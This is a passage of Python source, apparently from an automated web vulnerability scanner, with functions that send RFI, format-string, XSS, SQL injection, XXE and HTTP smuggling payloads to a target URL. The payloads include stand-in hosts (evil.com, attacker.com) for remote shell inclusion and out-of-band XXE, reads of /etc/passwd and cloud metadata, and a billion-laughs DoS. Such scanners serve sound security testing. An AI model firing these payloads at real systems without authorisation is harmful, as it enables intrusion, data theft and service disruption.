                                "field": field_name,
                                "payload": payload,
                                "severity": "MEDIUM",
                                "description": "Server parses email headers (potential injection)"
                            })
                    
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} email injection vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No email injection found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.11.2 - REMOTE FILE INCLUSION (RFI) TESTING
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_rfi(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-11.2: Test for Remote File Inclusion (RFI)
    
    Tests if application includes files from remote URLs.
    Common in PHP applications with include/require functions.
    
    Reference: https://owasp.org/www-community/attacks/Remote_File_Inclusion
    """
    try:
        findings = []
        
        # RFI test payloads (using known external resources)
        # In production, use your own controlled server
        rfi_payloads = [
            # External URL inclusion
            ('http://www.google.com/robots.txt', 'external_http'),
            ('https://www.google.com/robots.txt', 'external_https'),
            
            # PHP shell (example - should use controlled server)
            ('http://evil.com/shell.txt', 'php_shell_http'),
            
            # Data URI (some parsers accept this)
            ('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==', 'data_uri'),
            
            # Expect:// wrapper (PHP)
            ('expect://id', 'expect_wrapper'),
            
            # FTP wrapper
            ('ftp://evil.com/shell.txt', 'ftp_inclusion'),
        ]
        
        detection_patterns = [
            (r'User-agent: \*|Disallow:', 'External file included (robots.txt)', 'CRITICAL'),
            (r'phpinfo\(\)|PHP Version', 'PHP code execution via RFI', 'CRITICAL'),
            (r'uid=\d+\(|root:', 'Command execution via expect://', 'CRITICAL'),
            (r'failed to open stream|include.*failed|require.*failed', 'File inclusion attempted (error)', 'HIGH'),
        ]
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(15.0)) as client:
            # Discover parameters
            test_params = []
            if param:
                test_params = [param]
            else:
                # Common RFI parameters
                test_params = ['file', 'page', 'include', 'template', 'path', 'doc', 'document']
            
            for param_name in test_params:
                for payload, attack_type in rfi_payloads:
                    try:
                        # Test GET
                        test_url = f"{url}?{param_name}={quote(payload)}"
                        response = await client.get(test_url, follow_redirects=True)
                        
                        # Check for successful inclusion
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response.text, re.IGNORECASE):
                                findings.append({
                                    "type": "RFI",
                                    "parameter": param_name,
                                    "attack_type": attack_type,
                                    "payload": payload,
                                    "evidence": response.text[:400],
                                    "severity": severity,
                                    "description": description,
                                })
                                break
                        
                        # Check response headers for external content
                        if 'google' in response.text.lower() or 'robots.txt' in response.text.lower():
                            findings.append({
                                "type": "RFI_CONFIRMED",
                                "parameter": param_name,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "description": "External URL content was included in response"
                            })
                    
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} RFI vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No RFI vulnerabilities found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# 4.7.13 - FORMAT STRING INJECTION TESTING
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_format_string(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-INPV-13: Test for Format String Injection
    
    Tests if user input is used directly in printf-style functions.
    Common in C/C++ applications, but also Python % formatting.
    
    Reference: https://owasp.org/www-community/attacks/Format_string_attack
    """
    try:
        findings = []
        
        # Format string payloads
        format_payloads = [
            # Memory disclosure
            ('%x %x %x %x %x', 'memory_disclosure'),
            ('%p %p %p %p', 'pointer_disclosure'),
            ('%s %s %s %s', 'string_disclosure'),
            
            # Stack reading
            ('%1$x %2$x %3$x', 'positional_disclosure'),
            
            # Write to memory (dangerous)
            ('%n', 'memory_write'),
            
            # Python format string
            ('{0} {1} {2}', 'python_format'),
            ('{__init__.__globals__}', 'python_globals'),
            
            # String repetition (DoS)
            ('%1000000s', 'format_dos'),
        ]
        
        detection_patterns = [
            (r'0x[0-9a-f]{4,}', 'Memory address leaked via format string', 'HIGH'),
            (r'\b[0-9a-f]{8,}\b', 'Hexadecimal values (possible memory leak)', 'MEDIUM'),
            (r'(AttributeError|ValueError).*format', 'Format string error', 'MEDIUM'),
            (r'__builtins__|__globals__|__import__', 'Python internal objects exposed', 'CRITICAL'),
        ]
        
        async with httpx.AsyncClient(timeout=httpx.Timeout(20.0)) as client:
            # Discover parameters
            test_params = []
            if param:
                test_params = [param]
            else:
                test_params = ['q', 'search', 'msg', 'text', 'data', 'log', 'debug']
            
            for param_name in test_params:
                for payload, attack_type in format_payloads:
                    try:
                        # Test GET
                        test_url = f"{url}?{param_name}={quote(payload)}"
                        start_time = time.time()
                        response = await client.get(test_url)
                        elapsed = time.time() - start_time
                        
                        # Check for format string indicators
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response.text):
                                findings.append({
                                    "type": "FORMAT_STRING",
                                    "parameter": param_name,
                                    "attack_type": attack_type,
                                    "payload": payload,
                                    "evidence": response.text[:300],
                                    "severity": severity,
                                    "description": description,
                                })
                                break
                        
                        # Check for timing anomaly (DoS)
                        if elapsed > 5 and attack_type == 'format_dos':
                            findings.append({
                                "type": "FORMAT_STRING_DOS",
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": f"Response took {elapsed:.2f} seconds",
                                "severity": "MEDIUM",
                            })
                        
                        # Test POST
                        response = await client.post(url, data={param_name: payload})
                        for pattern, description, severity in detection_patterns:
                            if re.search(pattern, response.text):
                                findings.append({
                                    "type": "FORMAT_STRING_POST",
                                    "parameter": param_name,
                                    "payload": payload,
                                    "evidence": response.text[:300],
                                    "severity": severity,
                                })
                                break
                    
                    except httpx.TimeoutException:
                        if attack_type == 'format_dos':
                            findings.append({
                                "type": "FORMAT_STRING_DOS",
                                "severity": "MEDIUM",
                                "description": "Timeout indicates possible format string DoS"
                            })
                    except Exception:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} format string vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No format string vulnerabilities found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# CRITICAL MISSING TOOLS - Added for Agent Compatibility
# ============================================================================

# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_xss_reflected(
    url: str,
    param: Optional[str] = None,
    method: str = "GET",
    post_data: Optional[Union[str, Dict[str, Any]]] = None,
    content_type: str = "application/x-www-form-urlencoded",
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    WSTG-INPV-01: Test for Reflected XSS (PHASE 2.2 ENHANCED)

    Tests if user input is immediately reflected in response without encoding.
    Most common XSS type, especially in search and error pages.

    ENHANCEMENTS:
    - POST body support for modern web apps (REST APIs with JSON payloads)
    - JSON content-type support for REST APIs
    - DOM XSS mining for client-side frameworks (React, Angular, Vue)
    - Authentication token injection (JWT/Bearer)

    Args:
        url: Target URL to test
        param: Specific parameter to test (optional)
        method: HTTP method (GET/POST), default GET
        post_data: POST body data (dict or string)
        content_type: Content-Type header for POST requests
        auth_session: Authentication session dict with token/cookies

    Reference: https://owasp.org/www-community/attacks/xss/
    """
    try:
        # Build config for enhanced dalfox execution
        config = {
            "method": method,
            "post_data": post_data,
            "content_type": content_type,
            "auth_session": auth_session or {}
        }

        dalfox_report = await run_dalfox_scan(url, param, config)
        dalfox_meta = {
            "status": dalfox_report.get("status"),
            "message": dalfox_report.get("message"),
            "command": dalfox_report.get("command"),
            "duration": dalfox_report.get("duration"),
            "returncode": dalfox_report.get("returncode"),
            "findings": dalfox_report.get("findings", []),
            "stdout": dalfox_report.get("raw_output"),
            "stderr": _truncate_output(dalfox_report.get("stderr", ""))
        }

        if dalfox_report.get("status") == "error":
            return {
                "status": "error",
                "message": dalfox_report.get("message", "dalfox execution failed"),
                "data": {"dalfox": dalfox_meta}
            }

        findings = dalfox_report.get("findings", [])
        vulnerable = bool(findings)
        message = f"Dalfox confirmed {len(findings)} reflected/stored XSS finding(s)" if vulnerable else "Dalfox did not detect reflected/stored XSS"
        return {
            "status": "success",
            "data": {
                "vulnerable": vulnerable,
                "findings": findings[:10],
                "message": message,
                "dalfox": dalfox_meta,
                "source": "dalfox"
            }
        }
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def _manual_sqli_detection(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    Manual SQL injection detection using error-based and boolean-based techniques.
    Fallback when sqlmap fails to detect HTML error responses.
    """
    sqli_payloads = [
        ("'", "error_single_quote"),
        ("\"", "error_double_quote"),
        ("'--", "comment_injection"),
        ("' OR '1'='1", "boolean_true"),
        ("' OR '1'='2", "boolean_false"),
        ("')) OR 1=1--", "parenthesis_boolean"),
        ("' UNION SELECT NULL--", "union_null"),
    ]

    # SQL error keywords to detect in response
    sql_error_keywords = [
        "SQL", "sqlite", "mysql", "postgresql", "oracle", "syntax error",
        "SQLITE_ERROR", "ORA-", "PG::", "mysql_fetch", "unclosed quotation",
        "pg_query", "pg_exec", "mysqli", "PDOException", "SQLite3::"
    ]

    findings = []

    try:
        async with httpx.AsyncClient(timeout=15, follow_redirects=True, verify=False) as client:
            # Get baseline response
            baseline_resp = await client.get(url)
            baseline_status = baseline_resp.status_code
            baseline_length = len(baseline_resp.text)

            for payload, payload_type in sqli_payloads:
                # Inject payload into URL
                if '?' in url:
                    if param:
                        # Replace specific parameter
                        import re
                        test_url = re.sub(f"({param}=)[^&]*", f"\\1{quote(payload)}", url)
                    else:
                        # Append to first parameter
                        test_url = url + quote(payload)
                else:
                    # Add as new parameter
                    test_url = f"{url}?{param or 'id'}={quote(payload)}"

                try:
                    resp = await client.get(test_url, timeout=10)
                    resp_text = resp.text.lower()

                    # Check for SQL error indicators in response
                    error_found = any(keyword.lower() in resp_text for keyword in sql_error_keywords)

                    # Check for HTTP 500/400 errors (common for SQLi)
                    status_anomaly = resp.status_code in [500, 400] and baseline_status == 200

                    # ENHANCED: Also detect if payload changes error message (different errors = SQLi)
                    baseline_has_error = any(keyword.lower() in baseline_resp.text.lower() for keyword in sql_error_keywords)
                    error_message_changed = error_found and not baseline_has_error

                    # Check for significant response length difference
                    length_diff = abs(len(resp.text) - baseline_length) > 500

                    # Report if: SQL error found, status anomaly, OR error message appeared with payload
                    if error_found or status_anomaly or error_message_changed:
                        findings.append({
                            "parameter": param or "unknown",
                            "payload": payload,
                            "type": payload_type,
                            "evidence": {
                                "status_code": resp.status_code,
                                "baseline_status": baseline_status,
                                "error_detected": error_found,
                                "response_snippet": resp.text[:500]
                            },
                            "url": test_url,
                            "severity": "critical"
                        })
                        logger.info(f"[manual_sqli] Detected SQLi with payload: {payload} (status: {resp.status_code})")

                except Exception as e:
                    logger.warning(f"[manual_sqli] Payload test failed: {e}")
                    continue

    except Exception as e:
        logger.error(f"[manual_sqli] Detection failed: {e}")
        return {"status": "error", "findings": [], "error": str(e)}

    return {"status": "success", "findings": findings}


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_sqli(
    url: str,
    param: Optional[str] = None,
    method: str = "GET",
    post_data: Optional[Union[str, Dict[str, Any]]] = None,
    content_type: str = "application/x-www-form-urlencoded",
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    WSTG-INPV-05: Test for SQL Injection (PHASE 2.1 ENHANCED)

    Tests if SQL queries are vulnerable to injection attacks.
    Uses time-based, error-based, and boolean-based detection.

    ENHANCEMENTS:
    - POST body support for modern web apps (REST APIs with search endpoints)
    - JSON content-type support
    - Authentication token injection (JWT/Bearer)
    - Cookie-based session support

    Args:
        url: Target URL to test
        param: Specific parameter to test (optional)
        method: HTTP method (GET/POST), default GET
        post_data: POST body data (dict or string)
        content_type: Content-Type header for POST requests
        auth_session: Authentication session dict with token/cookies

    Reference: https://portswigger.net/web-security/sql-injection
    """
    try:
        # Build config for enhanced sqlmap execution
        config = {
            "method": method,
            "post_data": post_data,
            "content_type": content_type,
            "auth_session": auth_session or {}
        }

        # Try sqlmap first (comprehensive but may miss some cases)
        sqlmap_report = await run_sqlmap_scan(url, param, config)
        sqlmap_meta = {
            "status": sqlmap_report.get("status"),
            "message": sqlmap_report.get("message"),
            "command": sqlmap_report.get("command"),
            "duration": sqlmap_report.get("duration"),
            "returncode": sqlmap_report.get("returncode"),
            "findings": sqlmap_report.get("findings", []),
            "stdout": sqlmap_report.get("raw_output"),
            "stderr": _truncate_output(sqlmap_report.get("stderr", ""))
        }

        if sqlmap_report.get("status") == "error":
            return {
                "status": "error",
                "message": sqlmap_report.get("message", "sqlmap execution failed"),
                "data": {"sqlmap": sqlmap_meta}
            }

        findings = sqlmap_report.get("findings", [])

        # If sqlmap found nothing, try manual detection as fallback
        if not findings:
            logger.info("[test_sqli] sqlmap found nothing, trying manual detection...")
            manual_result = await _manual_sqli_detection(url, param)
            manual_findings = manual_result.get("findings", [])

            if manual_findings:
                logger.info(f"[test_sqli] Manual detection found {len(manual_findings)} SQLi vulnerabilities!")
                findings = manual_findings
                source = "manual_detection"
                message = f"Manual detection confirmed {len(findings)} SQL injection point(s)"
            else:
                source = "sqlmap"
                message = "No SQL injection detected (sqlmap + manual)"
        else:
            source = "sqlmap"
            message = f"sqlmap confirmed {len(findings)} injection point(s)"

        vulnerable = bool(findings)
        return {
            "status": "success",
            "data": {
                "vulnerable": vulnerable,
                "findings": findings,
                "message": message,
                "source": source,
                "sqlmap": sqlmap_meta
            }
        }

    except Exception as e:
        return {"status": "error", "message": str(e)}


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_lfi(url: str, param: Optional[str] = None) -> Dict[str, Any]:
    """
    WSTG-ATHZ-01: Test for Local File Inclusion (Path Traversal)
    
    Tests if application allows reading arbitrary files from server.
    Relies on ffuf for automated fuzzing rather than manual payloads.
    
    Reference: https://owasp.org/www-community/attacks/Path_Traversal
    """
    try:
        ffuf_report = await run_ffuf_lfi_scan(url, param)
        ffuf_meta = {
            "status": ffuf_report.get("status"),
            "message": ffuf_report.get("message"),
            "command": ffuf_report.get("command"),
            "duration": ffuf_report.get("duration"),
            "returncode": ffuf_report.get("returncode"),
            "findings": ffuf_report.get("findings", []),
            "stdout": ffuf_report.get("raw_output"),
            "stderr": _truncate_output(ffuf_report.get("stderr", ""))
        }
        
        if ffuf_report.get("status") == "error":
            return {
                "status": "error",
                "message": ffuf_report.get("message", "ffuf execution failed"),
                "data": {"ffuf": ffuf_meta}
            }

        findings = ffuf_report.get("findings", [])
        vulnerable = bool(findings)
        message = f"ffuf confirmed {len(findings)} potential LFI payload(s)" if vulnerable else "ffuf did not identify LFI-positive responses"
        return {
            "status": "success",
            "data": {
                "vulnerable": vulnerable,
                "findings": findings[:10],
                "message": message,
                "ffuf": ffuf_meta,
                "source": "ffuf"
            }
        }
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def _test_xxe_via_svg_upload(upload_endpoint: str, auth_session: Optional[Dict[str, Any]] = None) -> List[Dict[str, Any]]:
    """
    Test XXE via SVG file upload (common attack vector for image upload endpoints).

    Common vulnerable endpoints to test:
    - /file-upload, /upload, /api/upload
    - /profile/image/upload, /avatar/upload
    - /api/complaints, /api/feedback (if they accept file attachments)
    """
    findings = []

    # SVG with XXE payload
    svg_xxe_payloads = [
        # Basic file disclosure
        ("""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>""", "svg_file_disclosure"),

        # Windows file
        ("""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>""", "svg_windows_file"),

        # SSRF attempt
        ("""<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>""", "svg_ssrf")
    ]

    headers = {}
    if auth_session:
        token = auth_session.get("token") or auth_session.get("access_token")
        if token:
            headers["Authorization"] = f"Bearer {token}"

    async with httpx.AsyncClient(timeout=30, follow_redirects=True, verify=False) as client:
        for svg_payload, attack_type in svg_xxe_payloads:
            try:
                # Upload SVG file with XXE payload
                files = {"file": ("xxe_test.svg", svg_payload, "image/svg+xml")}

                upload_resp = await client.post(
                    upload_endpoint,
                    files=files,
                    headers=headers,
                    timeout=15
                )

                # Check if file was uploaded and processed
                if upload_resp.status_code in [200, 201]:
                    # Try to access uploaded file
                    response_text = upload_resp.text
                    response_json = None
                    try:
                        response_json = upload_resp.json()
                    except:
                        pass

                    # Check for file disclosure in response
                    disclosure_patterns = [
                        (r"root:.*:0:0:", "Unix /etc/passwd disclosed via SVG XXE"),
                        (r"\[fonts\]", "Windows win.ini disclosed via SVG XXE"),
                        (r"daemon:.*:/usr/sbin", "System file disclosed via SVG XXE"),
                        (r"ami-id|instance-id", "AWS metadata disclosed via SVG SSRF"),
                    ]

                    for pattern, description in disclosure_patterns:
                        if re.search(pattern, response_text):
                            findings.append({
                                "attack_type": attack_type,
                                "endpoint": upload_endpoint,
                                "evidence": description,
                                "severity": "critical",
                                "type": "xxe_svg_upload",
                                "response_snippet": response_text[:200]
                            })
                            logger.info(f"[XXE SVG] Found: {description}")
                            break

                    # Check if uploaded file URL is returned
                    if response_json and isinstance(response_json, dict):
                        file_url = response_json.get("file") or response_json.get("url") or response_json.get("path")
                        if file_url:
                            # Try to access the uploaded SVG
                            try:
                                file_resp = await client.get(file_url, headers=headers, timeout=10)
                                for pattern, description in disclosure_patterns:
                                    if re.search(pattern, file_resp.text):
                                        findings.append({
                                            "attack_type": f"{attack_type}_accessed",
                                            "endpoint": upload_endpoint,
                                            "file_url": file_url,
                                            "evidence": f"{description} (via uploaded file access)",
                                            "severity": "critical",
                                            "type": "xxe_svg_stored"
                                        })
                                        logger.info(f"[XXE SVG Stored] Found: {description} at {file_url}")
                                        break
                            except:
                                pass

            except asyncio.TimeoutError:
                logger.warning(f"[XXE SVG] Timeout testing {upload_endpoint}")
            except Exception as e:
                logger.warning(f"[XXE SVG] Error: {e}")
                continue

    return findings


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_xxe(
    url: str,
    param: Optional[str] = None,
    upload_endpoint: Optional[str] = None,
    auth_session: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """
    WSTG-INPV-07: Test for XXE Injection (PHASE 2.3 ENHANCED)

    Tests if XML parsers are vulnerable to external entity attacks.
    Can lead to file disclosure, SSRF, and DoS.

    ENHANCEMENTS:
    - SVG file upload with XXE payload (common for image upload endpoints)
    - Authentication token support for protected upload endpoints
    - Both direct XML POST and file upload testing

    Args:
        url: Target URL for direct XML POST
        param: Optional parameter
        upload_endpoint: File upload endpoint for SVG XXE testing
        auth_session: Authentication session dict with token/cookies

    Reference: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
    """
    try:
        findings = []

        # PHASE 2.3 ENHANCEMENT: SVG Upload XXE Testing
        if upload_endpoint:
            logger.info(f"[test_xxe] Testing SVG upload XXE at {upload_endpoint}")
            svg_findings = await _test_xxe_via_svg_upload(upload_endpoint, auth_session)
            findings.extend(svg_findings)

        # Original direct XML POST testing
        # XXE payloads
        payloads = [
            # Basic XXE - File disclosure
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>""",

            # Windows file disclosure
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<data>&xxe;</data>""",

            # Blind XXE - OOB data exfiltration
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<data>test</data>""",

            # PHP wrapper for base64 encoding
            """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<data>&xxe;</data>""",

            # Billion laughs attack (DoS)
            """<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>""",
        ]

        headers = {"Content-Type": "application/xml"}

        # Add authentication if provided
        if auth_session:
            token = auth_session.get("token") or auth_session.get("access_token")
            if token:
                headers["Authorization"] = f"Bearer {token}"

        async with httpx.AsyncClient(timeout=30, follow_redirects=True, verify=False) as client:
            for payload in payloads:
                try:
                    # Test POST with XML content type
                    xxe_resp = await client.post(
                        url,
                        content=payload,
                        headers=headers,
                        timeout=15
                    )
                    
                    # Check for file disclosure
                    disclosure_patterns = [
                        (r"root:.*:0:0:", "Unix /etc/passwd disclosed"),
                        (r"\[fonts\]", "Windows win.ini disclosed"),
                        (r"daemon:.*:/usr/sbin", "System file disclosed"),
                    ]
                    
                    for pattern, description in disclosure_patterns:
                        if re.search(pattern, xxe_resp.text):
                            findings.append({
                                "payload": payload[:100] + "...",
                                "evidence": description,
                                "severity": "critical",
                                "type": "xxe_file_disclosure"
                            })
                            break
                    
                    # Check for DoS indicators
                    if "lolz" in payload and len(xxe_resp.text) > 100000:
                        findings.append({
                            "payload": "Billion laughs attack",
                            "evidence": f"Response size: {len(xxe_resp.text)} bytes (possible DoS)",
                            "severity": "high",
                            "type": "xxe_dos"
                        })
                
                except asyncio.TimeoutError:
                    if "lol" in payload:  # Billion laughs
                        findings.append({
                            "payload": "Billion laughs attack",
                            "evidence": "Request timed out (DoS successful)",
                            "severity": "high",
                            "type": "xxe_dos_confirmed"
                        })
                except Exception:
                    continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings[:5],
                    "message": f"Found {len(findings)} XXE vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No XXE vulnerabilities found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def test_http_smuggling(url: str) -> Dict[str, Any]:
    """
    WSTG-INPV-15: Test for HTTP Request Smuggling
    
    Tests for discrepancies between frontend and backend HTTP parsing.
    Can lead to request routing attacks, cache poisoning, and access control bypass.
    
    Reference: https://portswigger.net/web-security/request-smuggling
    """
    try:
        findings = []
        parsed = urlparse(url)
        host = f"{parsed.scheme}://{parsed.netloc}"
        
        # CL.TE smuggling payloads
        cl_te_payloads = [
            # Basic CL.TE
            b"POST / HTTP/1.1\r\n"
            b"Host: " + parsed.netloc.encode() + b"\r\n"
            b"Content-Length: 6\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"0\r\n"
            b"\r\n"
            b"X",
            
            # TE.CL
            b"POST / HTTP/1.1\r\n"
            b"Host: " + parsed.netloc.encode() + b"\r\n"
            b"Content-Length: 4\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"\r\n"
            b"12\r\n"
            b"SMUGGLED\r\n"
            b"0\r\n"
            b"\r\n",
        ]
        
        async with httpx.AsyncClient(timeout=30, verify=False) as client:
            # Get baseline response
            baseline = await client.get(url)
            
            for payload_bytes in cl_te_payloads:
                try:
                    # Send smuggling attempt
                    # Note: httpx doesn't support raw TCP, so this is limited
                    # In production, use socket library or specialized tool
                    
                    response = await client.post(
                        url,
                        content=payload_bytes,
                        headers={"Connection": "keep-alive"},
                        timeout=10
                    )
                    
                    # Check for smuggling indicators
                    if response.status_code != baseline.status_code:
                        findings.append({
                            "evidence": "Different status code received",
                            "severity": "high",
                            "type": "potential_http_smuggling"
                        })
                
                except Exception:
                    continue
        
        # Note: HTTP smuggling is difficult to test automatically
        # This implementation provides basic detection only
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Potential HTTP smuggling detected (manual verification recommended)"
                }
            }
        else:
            return {
                "status": "success",
                "data": {
                    "vulnerable": False,
                    "message": "No HTTP smuggling detected (note: automated detection is limited)"
                }
            }
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


# @mcp.tool()  # REMOVED: Using JSON-RPC adapter
async def run_nuclei_scan(url: str, templates: List[str] = None) -> Dict[str, Any]:
    """
    Run Nuclei vulnerability scanner with specified templates
    
    Nuclei is a fast tool for scanning with community templates.
    
    Args:
        url: Target URL
        templates: List of template tags (e.g., ["cve", "sqli", "xss"])
    
    Returns:
        Dict with scan results
    """
    try:
        if templates is None:
            templates = ["cve", "vulnerabilities"]
        
        # Check if nuclei is installed
        nuclei_check = subprocess.run(
            ["nuclei", "-version"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if nuclei_check.returncode != 0:
            return {
                "status": "error",
                "message": "Nuclei not installed. Install with: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
            }
        
        # Build nuclei command
        cmd = ["nuclei", "-u", url, "-silent", "-json"]
        for template in templates:
            cmd.extend(["-tags", template])
        
        # Run nuclei
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=300  # 5 minutes timeout
        )
        
        findings = []
        if result.stdout:
            # Parse JSON output
            for line in result.stdout.strip().split('\n'):
                if line:
                    try:
                        finding = json.loads(line)
                        findings.append({
                            "template": finding.get("template-id"),
                            "name": finding.get("info", {}).get("name"),
                            "severity": finding.get("info", {}).get("severity"),
                            "description": finding.get("info", {}).get("description"),
                            "matched": finding.get("matched-at")
                        })
                    except json.JSONDecodeError:
                        continue
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Nuclei found {len(findings)} vulnerabilities"
                }
            }
        else:
            return {
                "status": "success",
                "data": {
                    "vulnerable": False,
                    "message": "Nuclei scan completed, no vulnerabilities found"
                }
            }
    
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": "Nuclei scan timed out after 5 minutes"}
    except FileNotFoundError:
        return {
            "status": "error",
            "message": "Nuclei not found in PATH. Please install nuclei first."
        }
    except Exception as e:
        return {"status": "error", "message": str(e)}


# ============================================================================
# POST PARAMETER TESTING - For Forms and JSON APIs
# ============================================================================

async def test_xss_post(url: str, data: Optional[Dict[str, str]] = None, content_type: str = "application/x-www-form-urlencoded") -> Dict[str, Any]:
    """
    Test POST parameters for Reflected XSS
    
    Args:
        url: Target URL
        data: POST data dictionary (e.g., {"username": "test", "comment": "test"})
        content_type: "application/x-www-form-urlencoded" or "application/json"
    """
    try:
        import httpx
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "{{7*7}}",  # Template injection
            "'><script>alert(1)</script>",
            "\"><svg/onload=alert(1)>"
        ]
        
        findings = []
        
        async with httpx.AsyncClient(timeout=15, verify=False, follow_redirects=True) as client:
            # Test each parameter with XSS payloads
            if data:
                for param_name, param_value in data.items():
                    for payload in xss_payloads:
                        test_data = data.copy()
                        test_data[param_name] = payload
                        
                        try:
                            if content_type == "application/json":
                                resp = await client.post(url, json=test_data, headers={"Content-Type": "application/json"})
                            else:
                                resp = await client.post(url, data=test_data)
                            
                            # Check if payload is reflected
                            if payload in resp.text or (payload == "{{7*7}}" and "49" in resp.text):
                                findings.append({
                                    "parameter": param_name,
                                    "payload": payload,
                                    "method": "POST",
                                    "content_type": content_type,
                                    "evidence": resp.text[:200],
                                    "severity": "high"
                                })
                        except Exception:
                            pass
            else:
                # No data provided, try injecting in JSON body
                for payload in xss_payloads[:3]:
                    try:
                        test_json = {"q": payload, "search": payload, "comment": payload}
                        resp = await client.post(url, json=test_json)
                        if payload in resp.text:
                            findings.append({
                                "parameter": "json_body",
                                "payload": payload,
                                "method": "POST",
                                "evidence": resp.text[:200],
                                "severity": "high"
                            })
                    except Exception:
                        pass
        
        if findings:
            return {
                "status": "success",
                "data": {
                    "vulnerable": True,
                    "findings": findings,
                    "message": f"Found {len(findings)} POST XSS vulnerabilities"
                }
            }
        else:
            return {"status": "success", "data": {"vulnerable": False, "message": "No POST XSS found"}}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}


async def test_sqli_post(url: str, data: Optional[Dict[str, str]] = None, content_type: str = "application/x-www-form-urlencoded") -> Dict[str, Any]:
    """
    Test POST parameters for SQL Injection
    
    Args:
        url: Target URL
        data: POST data dictionary
        content_type: Form-encoded or JSON
    """
    try:
        import httpx
        import time
        
        sql_payloads = [
            ("'", "error_based"),
            ('" OR 1=1--', "boolean_based"),
            ("' OR '1'='1", "boolean_based"),
            ("admin'--", "auth_bypass"),
            ("' AND SLEEP(5)--", "time_based"),
            ("' UNION SELECT NULL--", "union_based")
        ]
        
        findings = []
        
        async with httpx.AsyncClient(timeout=20, verify=False, follow_redirects=True) as client:
            if data:
                for param_name, param_value in data.items():
                    for payload, attack_type in sql_payloads:
                        test_data = data.copy()
